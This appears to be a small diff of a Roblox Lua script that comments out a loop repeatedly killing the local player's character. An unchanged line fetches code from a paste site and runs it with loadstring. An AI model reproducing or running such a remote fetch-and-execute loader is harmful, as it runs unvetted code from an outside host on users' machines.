@@ -253,7 +253,7 @@ task.spawn(function()
 loadstring(game:HttpGet("https://pastefy.app/3aNMAC9N/raw",true))();
 end)
 
-
+--[[
 local plr = game:GetService'Players'.LocalPlayer
 wait(9)
 
@@ -262,3 +262,4 @@ task.wait(1)
 while wait(4) do
 plr.Character.Humanoid.Health = 0
 end;
+]]--
